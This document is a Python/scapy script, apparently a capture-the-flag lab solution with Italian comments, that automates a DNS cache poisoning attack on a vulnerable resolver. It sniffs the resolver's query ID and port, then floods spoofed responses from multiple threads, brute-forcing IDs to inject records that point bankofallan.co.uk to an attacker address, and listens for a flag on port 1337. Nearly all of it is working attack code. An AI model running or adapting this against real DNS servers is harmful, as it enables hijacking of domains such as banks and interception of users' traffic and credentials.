'''
- For the attack to succeed, you have to parse a queryid number from a query made to badguy.ru. 
  You can extract a query by programming a small udp server listening on badguyDNSport on your attacking machine. 
  Hence, whenever you do a query for badguy.ru, the vulnDNS serve will make a recursive query to badguy.ru 
  (which is your machine)
- Remember that you should also have another UDP server listening for the FLAG on port 1337 
  (the flag is sent only if the attack is successful).
- For any issue look at the dns.log file, which logs all queries received as well as successfull attacks.
- If possible write everything under one program only so that all is automated for the attack 
  (parsing of queryID, cache poisoning and reception of the FLAG).
  '''

from threading import Thread
import time
from random import randint
from scapy.layers.inet import *
from scapy.layers.dns import *
from scapy.all import *

DNS_SPOOF_IP = "10.0.0.1"
BAD_DNS_IP = "192.168.56.1"
VULN_DNS_IP = "192.168.56.101"

Q_ID = 0                # query ID globale
PORT_NUMBER = 0         # porta da catturare
GOAL = 0                # va a 1 se riesco nell'attacco
RESTART = 0             # settata a 1 dal bad_client se ottiene risposta 10.0.0.1, cioe' se no poisoning
ERRORI = 0              # condizione di uscita per failure
N_TRY = 1               # tentativi provati

class FirstThread(Thread):

        def __init__(self, name, job, flood):
                Thread.__init__(self)
                self.name = name
                self.job = job
                self.flood = flood

        def run(self):
                #print ("Thread '" + self.name + "' avviato")
                # time.sleep(self.durata)

                if self.job == 0:                                                       # sniffer
                        sniffer_job()

                if self.job == 1:                                                       # sender
                        sender_job()

                if self.job == 2:                                                       # bad client
                        sender_job_2()

                if self.job == 3:                                                       # flooder
                        flooding_job(self.flood)

                if self.job == 4:                                                       # in ascolto per il secret
                        secret_job()

                #print ("[THREAD] '" + self.name + "' terminato.")



def sender_job():
        '''
        invio la prima query DNS per badguy.ru
        :return:
        '''
        time.sleep(1)
        send(IP(dst=VULN_DNS_IP) / UDP() / DNS(rd=1, qd=DNSQR(qname="badguy.ru")))
        #pkt = sr1(IP(dst="192.168.56.101") / UDP(dport=53) / DNS(rd=1, qd=DNSQR(qname="badguy.ru")))
        # p.show()

def sniffer_job():
        '''
        sniffo la query ricorsiva fatta all'host (server autoritativo per badguy.ru)
        catturo query ID e numero di porta
        :return:
        '''
        global Q_ID
        global PORT_NUMBER
        #pkts = sniff(count=4, timeout=2, filter="src host 192.168.56.101 and dst host 192.168.56.1 and dst port 53", lfilter=lambda pkt: pkt.haslayer(DNS))
        filtro = "src host " + VULN_DNS_IP + " and dst host " + BAD_DNS_IP + " and dst port 53"
        #print filtro
        pkts = sniff(count=1, timeout=2,
                     filter="src host " + VULN_DNS_IP + " and dst host " + BAD_DNS_IP + " and dst port 53",
                     lfilter=lambda pkt: pkt.haslayer(DNS))

        #print ('trovati ' + str(len(pkts)) + ' pacchetti')
        Q_ID = pkts[0].getlayer(DNS).id
        PORT_NUMBER = pkts[0].getlayer(UDP).sport


def sender_job_2():
        '''
        chiede alla vittima la query per bankofallan.co.uk, sincronizzato con i thread floodders
        :return:
        '''

        global GOAL
        global RESTART
        global N_TRY

        response = sr1(IP(dst=VULN_DNS_IP) / UDP() / DNS(rd=1, qd=DNSQR(qname="bankofallan.co.uk")))
        # TODO valutare se an o ar e togliere la print
        print "response: " + str(response[0].getlayer(DNS).an.rdata)
        if response[0].getlayer(DNS).an.rdata == DNS_SPOOF_IP:
                RESTART = 1
                N_TRY = N_TRY + 1
        else:
                GOAL = 1

def flooding_job(passo):
        '''
        manda pacchetti in base al passo
        :param passo:
        :return:
        '''

        global Q_ID
        global PORT_NUMBER

        '''for count in range(Q_ID+1+(passo*125), Q_ID+((passo+1)*125)):
                # mando pacchetti con il qID che varia

                #send(IP(dst=VULN_DNS_IP, src=DNS_SPOOF_IP) / UDP(sport=53, dport=PORT_NUMBER) / DNS(rd=1, qd=DNS(qname="badguy.ru")))

                # build the packet
                pkt = IP(dst=VULN_DNS_IP, src=DNS_SPOOF_IP) / UDP(sport=53, dport=PORT_NUMBER) / \
                      DNS(id=count, qr=1L, opcode='QUERY', aa=1L, tc=0L, rd=1L, ra=1L, z=0L, rcode='ok',
                          qdcount=1, ancount=1,
                          nscount=0, arcount=0,
                          qd=(DNSQR(qname='bankofallan.co.uk', qtype='NS', qclass='IN')),
                          an=None,
                          ns=(DNSRR(rrname='co.uk', type='NS', rclass='IN', ttl=60000, rdlen=24, rdata='bankofallan.co.uk')),
                          ar=(DNSRR(rrname='bankofallan.co.uk', type='A', rclass='IN', ttl=60000, rdlen=4, rdata=BAD_DNS_IP)) /
                             DNSRR(rrname='.', type=41, rclass=4096, ttl=32768, rdlen=0, rdata=''))
                send(pkt, verbose=0)'''

        count = 0
        step = 145
        while (RESTART == 0 and count <= step):
                # mando pacchetti con il qID che varia

                # send(IP(dst=VULN_DNS_IP, src=DNS_SPOOF_IP) / UDP(sport=53, dport=PORT_NUMBER) / DNS(rd=1, qd=DNS(qname="badguy.ru")))

                # build the packet
                q_id = ((Q_ID + 1 + passo*step + count) % 65535)
                print ('trying with ' + str(hex(q_id)))
                pkt = IP(dst=VULN_DNS_IP, src=DNS_SPOOF_IP) / UDP(sport=53, dport=PORT_NUMBER) / \
                      DNS(id= q_id, qr=1L, opcode='QUERY', aa=1L, tc=0L, rd=1L, ra=1L, z=0L, rcode='ok',
                          qdcount=1, ancount=1,
                          nscount=0, arcount=0,
                          qd=(DNSQR(qname='bankofallan.co.uk', qtype='NS', qclass='IN')),
                          an=None,
                          ns=(DNSRR(rrname='co.uk', type='NS', rclass='IN', ttl=60000, rdlen=24,
                                    rdata='bankofallan.co.uk')),
                          ar=(DNSRR(rrname='bankofallan.co.uk', type='A', rclass='IN', ttl=60000, rdlen=4,
                                    rdata=BAD_DNS_IP)) /
                             DNSRR(rrname='.', type=41, rclass=4096, ttl=32768, rdlen=0, rdata=''))
                send(pkt, verbose=0)
                count = count + 1

def secret_job():
        # pkts = sniff(count=4, timeout=3, filter="src host 192.168.56.101 and dst host 192.168.56.1 and dst port 53", prn=lambda x: x.summary())
        #scrt_pkt = sniff(count=1, filter="src host 192.168.56.101 and dst host 192.168.56.1 and dst port 1337")
        filtro = "src host " + VULN_DNS_IP + " and dst host " + BAD_DNS_IP + " and dst port 1337"
        scrt_pkt = sniff(count=1, filter= filtro)
        print "[VICTORY] got secret!"
        scrt_pkt[0].show()







############################ MAIN ###########################
# TODO start del thread in ascolto su 1337 prima degli altri

def master_job():
        '''
        - il bad client e i  flooders devono partire sulla stessa condizione (cioe' qID e PORT diversi da 0)
        :return:
        '''

        global ERRORI
        global GOAL
        global Q_ID
        global PORT_NUMBER
        global RESTART
        global N_TRY

        #listener_thread = FirstThread(name="listener", job=4, flood=None)
        #listener_thread.start()


        while GOAL == 0 and ERRORI < 3:
                print ('\n\n\nTry # ' + str(N_TRY))
                RESTART = 0

                # Creazione dei thread
                sniffer_thread = FirstThread(name="sniffer", job=0, flood=None)
                first_sender_thread = FirstThread(name="first sender", job=1, flood=None)
                sniffer_thread.start()
                first_sender_thread.start()
                sniffer_thread.join()
                first_sender_thread.join()

                print ('found qID: ' + str(hex(Q_ID)))
                print ('found port: ' + str(PORT_NUMBER))

                if (Q_ID == 0 or PORT_NUMBER == 0):
                        print '[MAIN] error on qID or port'
                        ERRORI = ERRORI + 1
                        continue

                bad_client_thread = FirstThread(name="bad client", job=2, flood=None)
                flooder_0 = FirstThread(name="flood0", job=3, flood=0)
                flooder_1 = FirstThread(name="flood1", job=3, flood=1)
                flooder_2 = FirstThread(name="flood2", job=3, flood=2)
                flooder_3 = FirstThread(name="flood3", job=3, flood=3)
                flooder_4 = FirstThread(name="flood4", job=3, flood=4)
                flooder_5 = FirstThread(name="flood5", job=3, flood=5)
                flooder_6 = FirstThread(name="flood6", job=3, flood=6)
                flooder_7 = FirstThread(name="flood7", job=3, flood=7)

                # TODO sinconia tra bad client e flooders
                flooder_0.start()
                flooder_1.start()
                flooder_2.start()
                flooder_3.start()
                flooder_4.start()
                flooder_5.start()
                flooder_6.start()
                flooder_7.start()
                bad_client_thread.start()

                flooder_0.join()
                flooder_1.join()
                flooder_2.join()
                flooder_3.join()
                flooder_4.join()
                flooder_5.join()
                flooder_6.join()
                flooder_7.join()
                bad_client_thread.join()

        if GOAL == 1:
                print "Goal reached."

        else:
                print "too many errors."


        #listener_thread.join()

master_job()